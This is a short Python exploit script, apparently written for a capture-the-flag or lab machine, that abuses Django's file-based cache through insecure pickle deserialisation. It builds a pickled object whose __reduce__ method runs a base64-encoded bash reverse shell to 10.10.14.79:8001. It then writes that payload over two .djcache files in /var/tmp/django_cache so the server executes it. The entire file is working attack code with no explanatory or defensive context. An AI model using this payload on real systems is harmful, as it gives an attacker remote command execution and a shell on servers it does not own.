import os
import base64
import pickle

class exploit(object):
    def __init__(self, cmd):
        self.payload = f"echo {cmd} | base64 -d | bash"
    
    def __reduce__(self):
        return (os.system, (self.payload,))

LHOST = "10.10.14.79"
LPORT = "8001"

cmd_raw = f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
cmd_b64 = base64.b64encode(cmd_raw.encode()).decode()

pickle_payload = pickle.dumps(exploit(cmd_b64))

# May need changing the file names
with open("/var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache", 'wb') as f:
    f.write(pickle_payload)

with open("/var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache", 'wb') as f:
    f.write(pickle_payload)
